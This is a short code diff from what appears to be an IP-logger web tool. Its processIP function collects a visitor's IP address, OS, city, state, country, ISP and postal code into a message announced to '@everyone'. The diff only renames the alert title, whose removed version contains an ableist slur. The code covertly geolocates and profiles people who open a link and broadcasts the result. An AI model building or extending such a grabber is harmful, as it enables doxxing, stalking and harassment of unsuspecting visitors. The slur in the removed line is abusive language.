@@ -38,7 +38,7 @@ def processIP():
   data = {}
   data['embeds'] = [
     {
-      'title': '⚠️ RETARDED BRAINDEAD PERSON FOUND! ⚠️',
+      'title': '⚠️ PERSON FOUND! ⚠️',
       'description': '**IP:** ' + ip + '\n**OS:** ' + request.headers.get('Sec-Ch-Ua-Platform').replace('"','') + '\n**Country:** ' + location['country'] + '\n**State:** ' + location['state'] + '\n**City:** ' + location['city'] + '\n**ISP:** ' + ISP + '\n**Organization:** ' + organization + '\n**postalcode:** ' + postalcode,
       'footer': '@everyone'
     }
